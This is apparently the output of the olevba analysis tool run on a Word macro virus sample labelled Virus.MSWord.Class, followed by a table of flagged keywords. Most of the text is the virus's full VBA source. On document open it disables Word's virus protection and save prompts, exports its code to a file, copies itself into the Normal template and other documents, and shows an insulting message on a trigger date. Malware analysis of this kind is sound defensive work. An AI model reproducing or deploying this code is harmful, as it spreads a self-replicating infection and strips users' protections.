olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-c05817bec0c1f3e4d54292ae265cf84d1bf5dc2f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-c05817bec0c1f3e4d54292ae265cf84d1bf5dc2f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'xLock27.09.04 11:45:03test
On Error GoTo out
'xLock27.09.04 11:45:03test
Options.VirusProtection = False
'xLock27.09.04 11:45:03test
Options.SaveNormalPrompt = False
'xLock27.09.04 11:45:03test
Options.ConfirmConversions = False
'xLock27.09.04 11:45:03test
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'xLock27.09.04 11:45:03test
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'xLock27.09.04 11:45:03test
If nt > 70 And ad > 0 Then GoTo out
'xLock27.09.04 11:45:03test
If nt < 70 Then
'xLock27.09.04 11:45:03test
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'xLock27.09.04 11:45:03test
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'xLock27.09.04 11:45:03test
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'xLock27.09.04 11:45:03test
End If
'xLock27.09.04 11:45:03test
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'xLock27.09.04 11:45:03test
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'xLock27.09.04 11:45:03test
host.codemodule.AddFromFile ("c:\class.sys")
'xLock27.09.04 11:45:03test
With host.codemodule
'xLock27.09.04 11:45:03test
    For x = 1 To 4
'xLock27.09.04 11:45:03test
    .deletelines 1
'xLock27.09.04 11:45:03test
    Next x
'xLock27.09.04 11:45:03test
End With
'xLock27.09.04 11:45:03test
If nt < 70 Then
'xLock27.09.04 11:45:03test
    With host.codemodule
'xLock27.09.04 11:45:03test
    .replaceline 1, "Sub AutoClose()"
'xLock27.09.04 11:45:03test
    .replaceline 71, "Sub ToolsMacro()"
'xLock27.09.04 11:45:03test
    End With
'xLock27.09.04 11:45:03test
End If
'xLock27.09.04 11:45:03test
With host.codemodule
'xLock27.09.04 11:45:03test
    For x = 2 To 72 Step 2
'xLock27.09.04 11:45:03test
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'xLock27.09.04 11:45:03test
    Next x
'xLock27.09.04 11:45:03test
End With
'xLock27.09.04 11:45:03test
out:
'xLock27.09.04 11:45:03test
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'xLock27.09.04 11:45:03test
End Sub
'xLock27.09.04 11:45:03test
Sub ViewVBCode()
'xLock27.09.04 11:45:03test
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

